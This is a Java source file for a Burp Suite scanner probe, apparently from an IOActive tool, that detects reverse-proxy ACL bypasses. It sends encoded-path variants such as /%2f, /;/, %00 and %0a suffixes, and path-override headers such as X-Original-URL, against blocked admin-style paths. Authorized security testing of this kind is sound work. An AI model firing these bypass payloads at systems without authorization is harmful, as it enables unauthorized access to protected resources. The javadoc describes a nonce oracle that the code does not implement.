package com.ioactive.aiscanner.scan;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.ioactive.aiscanner.scan.sast.SourceFindings;
import com.ioactive.aiscanner.scan.sast.StaticHint;
import com.ioactive.aiscanner.ui.ScanLog;

import java.net.URI;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.function.UnaryOperator;
import java.util.regex.Pattern;

/**
 * Proxy ACL bypass via path normalization and header injection.
 *
 * <p><b>Class of vulnerability.</b> Reverse proxies enforce access controls (HTTP 403/401) based on the
 * literal request path they see. Two distinct bypass mechanisms exploit the gap between what the proxy
 * checks and what the backend receives:
 *
 * <ol>
 *   <li><b>Path normalization inconsistency (CWE-284).</b> The proxy evaluates the raw path, then
 *       forwards it to the backend which decodes/normalizes it. {@code /%2fadmin} passes HAProxy's
 *       {@code path_beg /admin} ACL (the raw string starts with {@code /%2f}), but the gunicorn backend
 *       receives {@code /admin} after URL-decoding. Variants: encoded slashes, dot-segments, double
 *       slashes, semicolons, hex first-char, double-encoding.</li>
 *   <li><b>Header-based path override (CWE-441).</b> Some proxy stacks (Nginx, Traefik, mod_rewrite)
 *       route on the request path but forward backend-trusted headers like {@code X-Original-URL} or
 *       {@code X-Rewrite-URL}. An attacker sends a safe path ({@code /}) with a header pointing to the
 *       protected resource; the proxy passes the ACL check and the backend processes the header value.
 *       Non-destructive oracle: include a nonce in the header value and confirm it echoes back.</li>
 * </ol>
 *
 * <p><b>Oracle.</b> HTTP status differential: blocked_path→403/401, variant→2xx. Strengthened by body
 * check (not a short "Forbidden" page). Both paths fire only when the unmodified path was definitively
 * blocked — zero false positives on 404 vs 403 noise.
 *
 * <p><b>Generality.</b> Reads the site map for 403/401 paths (real-target crawl coverage), extends with
 * SAST-hinted protected routes, and seeds common sensitive paths as a fallback. Effective against:
 * HAProxy, Nginx, Envoy, Traefik, API Gateway, Cloudflare WAF, AWS ALB, and any proxy using path-based ACLs.
 */
public final class ProxyAclBypassProbe extends Probe {

    /** Common sensitive paths to probe when the site map has no 403s (fresh/uncrawled target). */
    private static final String[] SEEDS = {
        "/admin", "/administrator", "/api/admin", "/api/v1/admin", "/api/v2/admin",
        "/manager", "/management", "/control", "/dashboard", "/backend",
        "/internal", "/private", "/restricted", "/secure", "/hidden",
        "/status", "/metrics", "/debug", "/health/details", "/actuator",
        "/swagger", "/graphql", "/api-docs", "/openapi",
        "/config", "/settings", "/console", "/panel",
    };

    /** Header names used by proxies to override the request path (header injection bypass). */
    private static final String[] PATH_OVERRIDE_HEADERS = {
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Override-URL",
        "X-Forwarded-Path",
        "X-HTTP-Method-Override",   // some proxies honour this for path routing too
    };

    /** Response-header signals that the target is behind a reverse proxy. */
    private static final Pattern PROXY_SERVER = Pattern.compile(
            "(?i)haproxy|nginx|envoy|traefik|varnish|squid|apache|caddy|cloudflare");

    private SourceFindings sourceHints;

    public void setSourceHints(SourceFindings hints) { this.sourceHints = hints; }

    public ProxyAclBypassProbe(MontoyaApi api, ScanLog scanLog) {
        super(api, scanLog);
    }

    /**
     * @param host        the target URL (scheme://authority or bare authority)
     * @param withSession applies the active session cookie/bearer to a request
     * @return number of confirmed bypasses
     */
    public int probe(String host, UnaryOperator<HttpRequest> withSession) {
        int hits = 0;
        try {
            // `host` is the bare authority (host:port, no scheme). Infer scheme from the site map
            // (same logic as the SAST-only path in AiScanner): prefer http if we see it, fall back https.
            String base = schemeAuthority(host);
            if (base == null) {
                // host is authority-only — resolve scheme from the site map
                String scheme = "http";
                boolean sawHost = false;
                for (HttpRequestResponse smr : api.siteMap().requestResponses()) {
                    if (smr == null || smr.request() == null) continue;
                    String u = smr.request().url();
                    if (!host.equalsIgnoreCase(hostOf(u))) continue;
                    if (!u.regionMatches(true, 0, "https", 0, 5)) { scheme = "http"; break; }
                    if (!sawHost) { scheme = "https"; sawHost = true; }
                }
                base = scheme + "://" + host;
            }

            // 1. Collect 403/401 paths from the site map (real crawl coverage).
            Map<String, HttpRequestResponse> blocked = new LinkedHashMap<>();
            Set<String> seenPaths = new LinkedHashSet<>();
            for (HttpRequestResponse rr : api.siteMap().requestResponses()) {
                if (rr.response() == null) continue;
                String url = rr.request().url();
                if (!matchesHost(url, host)) continue;
                int st = rr.response().statusCode();
                if (st != 403 && st != 401) continue;
                String path = pathOf(url);
                if (path == null || path.isEmpty() || "/".equals(path)) continue;
                if (seenPaths.add(path)) blocked.put(path, rr);
            }

            // 2. Augment with SAST-hinted protected paths (bfla/authz/admin hints from source analysis).
            if (sourceHints != null) {
                for (StaticHint h : sourceHints.all()) {
                    if (h.path == null || h.path.isBlank()) continue;
                    boolean isProtected = "BFLA".equalsIgnoreCase(h.vulnClass)
                            || "AUTHZ".equalsIgnoreCase(h.vulnClass)
                            || "IDOR".equalsIgnoreCase(h.vulnClass)
                            || h.sinkType.toLowerCase().contains("admin")
                            || h.path.toLowerCase().contains("admin");
                    if (!isProtected) continue;
                    String p = h.path.startsWith("/") ? h.path : "/" + h.path;
                    if (!seenPaths.contains(p)) {
                        HttpRequestResponse rr = get(base + p, withSession);
                        if (rr != null && rr.response() != null) {
                            int st = rr.response().statusCode();
                            if ((st == 403 || st == 401) && seenPaths.add(p)) blocked.put(p, rr);
                        }
                    }
                }
            }

            // 3. Fallback: if still no blocked paths, probe the standard seed set.
            if (blocked.isEmpty()) {
                for (String seed : SEEDS) {
                    HttpRequestResponse rr = get(base + seed, withSession);
                    if (rr == null || rr.response() == null) continue;
                    int st = rr.response().statusCode();
                    if ((st == 403 || st == 401) && seenPaths.add(seed)) blocked.put(seed, rr);
                }
            }

            if (blocked.isEmpty()) {
                scanLog.debug("  proxy-acl-bypass: no 403/401 paths found — skipping");
                return 0;
            }

            // Detect proxy type. The 403 response is generated by the proxy's own deny handler (e.g.
            // HAProxy's http-request deny sends a bare 403 with no Server header). The more reliable
            // signal is the root GET response, which goes THROUGH the proxy to the backend and carries
            // the proxy's own response headers (Nginx adds Server: nginx/...; Envoy adds server: envoy +
            // x-envoy-upstream-service-time; Varnish adds X-Varnish + Via; CF adds CF-RAY).
            HttpRequestResponse rootRr = get(base + "/", withSession);
            String proxyType = detectProxyType(rootRr);
            // Fall back to the 403 response headers (works for Nginx: its deny-generated 403 still carries Server: nginx).
            if (proxyType.isEmpty()) proxyType = detectProxyType(blocked.values().iterator().next());
            scanLog.log("  proxy-acl-bypass: " + blocked.size() + " blocked path(s)"
                    + (proxyType.isEmpty() ? " [proxy: undetected]" : " [proxy: " + proxyType + "]")
                    + " → testing path-normalization + header-injection bypasses");

            // 4. Path normalization bypass: encoding variants of each blocked path.
            hits += testNormalizationVariants(base, blocked, proxyType, withSession);

            // 5. Header injection bypass: request a safe path with X-Original-URL / X-Rewrite-URL pointing
            //    to a blocked resource. Fires against any proxy that routes on the request line but trusts
            //    a backend-side path-override header (Nginx+proxy_pass, Traefik, AWS ALB+LB routing).
            hits += testHeaderInjection(base, blocked, proxyType, withSession);

        } catch (Throwable t) {
            scanLog.debug("proxy-acl-bypass probe error: " + t);
        }
        return hits;
    }

    // ---- path normalization bypass ----------------------------------------------------------------

    private int testNormalizationVariants(String base, Map<String, HttpRequestResponse> blocked,
                                          String proxyType, UnaryOperator<HttpRequest> withSession) {
        int hits = 0;
        Set<String> fired = new LinkedHashSet<>();
        for (Map.Entry<String, String> e : buildNormVariants(blocked.keySet()).entrySet()) {
            String variant   = e.getKey();
            String origPath  = e.getValue();
            if (!fired.add(origPath + "→" + variant)) continue;

            HttpRequestResponse orig = blocked.get(origPath);
            String reqBase = orig != null ? schemeAuthority(orig.request().url()) : base;
            if (reqBase == null) reqBase = base;

            HttpRequestResponse rr = get(reqBase + variant, withSession);
            if (!isBypass(rr)) continue;

            int origStatus = orig != null && orig.response() != null ? orig.response().statusCode() : 403;
            int bypassStatus = rr.response().statusCode();
            String proxyLabel = proxyType.isEmpty() ? "reverse proxy" : proxyType;
            String title = "Reverse proxy ACL bypass via path normalization"
                    + (proxyType.isEmpty() ? "" : " [" + proxyType + "]");
            scanLog.found(title, reqBase + origPath,
                    "Detected reverse proxy: " + proxyLabel + ". "
                    + "GET " + origPath + " → HTTP " + origStatus + " (blocked by proxy ACL); "
                    + "GET " + variant + " → HTTP " + bypassStatus + " (bypassed — ACL not enforced on encoded path). "
                    + "The " + proxyLabel + " ACL evaluates the raw request path before URL-decoding, "
                    + "but the backend normalizes the encoded path to the original resource. "
                    + "An unauthenticated attacker can reach the protected resource by sending the "
                    + "encoded variant (CWE-284 / OWASP API Security — Security Misconfiguration). "
                    + "Confirmed bypass technique: " + variant + ".",
                    rr, orig);
            scanLog.incFinding();
            hits++;
            scanLog.debug("  proxy-acl-bypass: NORM bypass " + origPath + " → " + variant + " (HTTP " + bypassStatus + ")");
        }
        return hits;
    }

    /**
     * Build a flat map of encoding-variant-path → original-blocked-path for all blocked paths.
     * Covers the variant set that concrete labs (HAProxy/Nginx/Envoy) and real production proxies
     * are known to be vulnerable to.
     */
    private static Map<String, String> buildNormVariants(Set<String> blockedPaths) {
        Map<String, String> out = new LinkedHashMap<>();
        for (String path : blockedPaths) {
            String p = path.startsWith("/") ? path.substring(1) : path;
            if (p.isEmpty()) continue;

            // First path segment for first-char hex encoding (e.g. /admin → /%61dmin).
            String firstSeg = p.contains("/") ? p.substring(0, p.indexOf('/')) : p;
            String restSegs = p.contains("/") ? p.substring(p.indexOf('/')) : "";
            String firstCharHex = "%" + String.format("%02x", (int) firstSeg.charAt(0))
                    + firstSeg.substring(1) + restSegs;

            List<String> variants = new ArrayList<>();
            // Encoded-slash prefix (HAProxy path_beg doesn't match /%2f*)
            variants.add("/%2f" + p);
            variants.add("/%2F" + p);
            // Dot-segment normalization
            variants.add("/./" + p);
            variants.add("/..%2f../" + p);
            // Semicolon segment (Nginx may strip it before forwarding)
            variants.add("/;/" + p);
            // Double slash (some proxies normalize //→/ but check the raw /)
            variants.add("//" + p);
            // Double-encoded slash
            variants.add("/%252f" + p);
            // First-char hex encoding (proxy doesn't decode before ACL check)
            variants.add("/" + firstCharHex);
            // Trailing modifiers that some proxies strip before ACL but forward verbatim
            variants.add("/" + p + "%09");    // tab
            variants.add("/" + p + "%20");    // space
            variants.add("/" + p + ".");      // trailing dot (Windows path normalization)
            variants.add("/" + p + "/");      // trailing slash
            variants.add("/" + p + "%00");    // null byte
            variants.add("/" + p + "%0a");    // newline (path confusion)
            // Uppercase (case-insensitive proxies vs case-sensitive backends)
            variants.add("/" + p.toUpperCase());

            for (String v : variants) out.putIfAbsent(v, path);
        }
        return out;
    }

    // ---- header injection bypass ------------------------------------------------------------------

    private int testHeaderInjection(String base, Map<String, HttpRequestResponse> blocked,
                                    String proxyType, UnaryOperator<HttpRequest> withSession) {
        int hits = 0;
        // Probe once per header+blocked-path combination. Use the root path as the safe request path
        // so the proxy's path ACL sees "/" (allowed) while the header carries the blocked resource.
        Set<String> fired = new LinkedHashSet<>();
        for (String hdrName : PATH_OVERRIDE_HEADERS) {
            for (Map.Entry<String, HttpRequestResponse> entry : blocked.entrySet()) {
                String blockedPath = entry.getKey();
                String key = hdrName + "→" + blockedPath;
                if (!fired.add(key)) continue;

                HttpRequestResponse orig = entry.getValue();
                String reqBase = orig != null ? schemeAuthority(orig.request().url()) : base;
                if (reqBase == null) reqBase = base;

                // Send GET / with the header pointing to the blocked path.
                HttpRequestResponse rr = getWithHeader(reqBase + "/", hdrName, blockedPath, withSession);
                if (!isBypass(rr)) continue;

                String bypassBody = rr.response().bodyToString();
                if (bypassBody == null) continue;
                // FP guard 1: if the backend echoed the override header name in the response body,
                // this is a raw/echo endpoint — the backend didn't interpret the header as a path override.
                if (bypassBody.toLowerCase().contains(hdrName.toLowerCase() + ":")) continue;
                // FP guard 2: response must differ substantially from a plain GET / (not just by the
                // injected header value itself — a small diff means no real resource was served differently).
                HttpRequestResponse baseline = get(reqBase + "/", withSession);
                if (baseline != null && baseline.response() != null) {
                    String baseBody = baseline.response().bodyToString();
                    if (baseBody == null) continue;
                    // Identical body → header had no effect
                    if (baseBody.equals(bypassBody)) continue;
                    // Body only differs by one line (the echoed header) → echo server, not a real bypass
                    String[] baseLines = baseBody.split("\n");
                    String[] bypassLines = bypassBody.split("\n");
                    if (Math.abs(baseLines.length - bypassLines.length) <= 1
                            && Math.abs(baseBody.length() - bypassBody.length()) < hdrName.length() + blockedPath.length() + 5) continue;
                }

                int origStatus = orig != null && orig.response() != null ? orig.response().statusCode() : 403;
                int bypassStatus = rr.response().statusCode();
                String proxyLabel = proxyType.isEmpty() ? "reverse proxy" : proxyType;
                String hdrTitle = "Reverse proxy ACL bypass via header injection"
                        + (proxyType.isEmpty() ? "" : " [" + proxyType + "]");
                scanLog.found(hdrTitle, reqBase + blockedPath,
                        "Detected reverse proxy: " + proxyLabel + ". "
                        + "GET " + blockedPath + " → HTTP " + origStatus + " (blocked by " + proxyLabel + " ACL); "
                        + "GET / with [" + hdrName + ": " + blockedPath + "] → HTTP " + bypassStatus
                        + " (bypassed). The " + proxyLabel + " enforces the ACL on the request path "
                        + "but forwards the " + hdrName + " header to the backend, which trusts it as the "
                        + "effective path — an unauthenticated attacker can reach the protected resource "
                        + "without triggering the proxy ACL (CWE-441).",
                        rr, orig);
                scanLog.incFinding();
                hits++;
                scanLog.debug("  proxy-acl-bypass: HEADER bypass " + blockedPath
                        + " via " + hdrName + " (HTTP " + bypassStatus + ")");
            }
        }
        return hits;
    }

    // ---- proxy-type detection -----------------------------------------------------------------------

    /**
     * Identify the reverse proxy product from response headers AND body.
     * Called twice: once on the root 200 (proxy forwarded response — carries proxy headers like Server: nginx),
     * once on the 403 (proxy-generated deny response — carries product-specific body text like HAProxy's
     * "Request forbidden by administrative rules").
     */
    private static String detectProxyType(HttpRequestResponse rr) {
        if (rr == null || rr.response() == null) return "";
        try {
            // Response headers — Nginx, Envoy, Traefik, Varnish, Cloudflare all advertise here
            for (String hdr : new String[]{"Server", "Via", "X-Powered-By", "X-Served-By"}) {
                String v = rr.response().headerValue(hdr);
                if (v != null) {
                    java.util.regex.Matcher m = PROXY_SERVER.matcher(v);
                    if (m.find()) return m.group().toLowerCase();
                }
            }
            // Proxy-unique response headers
            if (rr.response().headerValue("X-Varnish") != null)          return "varnish";
            if (rr.response().headerValue("CF-RAY") != null)              return "cloudflare";
            if (rr.response().headerValue("x-envoy-upstream-service-time") != null) return "envoy";
            if (rr.response().headerValue("X-Cache") != null)             return "cache-proxy";

            // Body fingerprints — HAProxy's built-in deny sends "administrative rules";
            // Nginx's deny sends plain "403 Forbidden"; Traefik sends "Forbidden".
            String body = rr.response().bodyToString();
            if (body != null) {
                String bl = body.toLowerCase();
                if (bl.contains("administrative rules"))                   return "haproxy";
                if (bl.contains("nginx"))                                  return "nginx";
                if (bl.contains("envoy"))                                  return "envoy";
                if (bl.contains("traefik"))                                return "traefik";
                if (bl.contains("varnish"))                                return "varnish";
                if (bl.contains("caddy"))                                  return "caddy";
            }
        } catch (Throwable ignore) { }
        return "";
    }

    // ---- oracle: is this response a real bypass? --------------------------------------------------

    private static boolean isBypass(HttpRequestResponse rr) {
        if (rr == null || rr.response() == null) return false;
        int st = rr.response().statusCode();
        if (st < 200 || st >= 300) return false;
        String body = rr.response().bodyToString();
        if (body == null || body.trim().length() < 3) return false;
        String bl = body.trim().toLowerCase();
        // Short "Forbidden" / "Access denied" pages still return 200 on some misconfigured stacks.
        if (bl.length() < 500 && (bl.contains("forbidden") || bl.contains("access denied")
                || bl.contains("not allowed") || bl.contains("unauthorized"))) return false;
        return true;
    }

    // ---- HTTP helpers -----------------------------------------------------------------------------

    private HttpRequestResponse get(String url, UnaryOperator<HttpRequest> withSession) {
        try {
            HttpRequest req = HttpRequest.httpRequestFromUrl(url).withMethod("GET");
            if (withSession != null) req = withSession.apply(req);
            politeness();
            return send(req);
        } catch (Throwable t) { return null; }
    }

    private HttpRequestResponse getWithHeader(String url, String hdrName, String hdrValue,
                                              UnaryOperator<HttpRequest> withSession) {
        try {
            HttpRequest req = HttpRequest.httpRequestFromUrl(url).withMethod("GET")
                    .withHeader(hdrName, hdrValue);
            if (withSession != null) req = withSession.apply(req);
            politeness();
            return send(req);
        } catch (Throwable t) { return null; }
    }

    // ---- URL helpers ------------------------------------------------------------------------------

    private boolean matchesHost(String url, String targetHost) {
        try {
            String auth = URI.create(url).getAuthority();
            if (auth == null) return false;
            if (targetHost.startsWith("http")) {
                String thAuth = URI.create(targetHost).getAuthority();
                return auth.equalsIgnoreCase(thAuth);
            }
            return targetHost.equalsIgnoreCase(auth);
        } catch (Exception e) { return false; }
    }

    private static String schemeAuthority(String url) {
        try {
            URI u = URI.create(url);
            if (u.getScheme() == null || u.getAuthority() == null) return null;
            return u.getScheme() + "://" + u.getAuthority();
        } catch (Exception e) { return null; }
    }
}
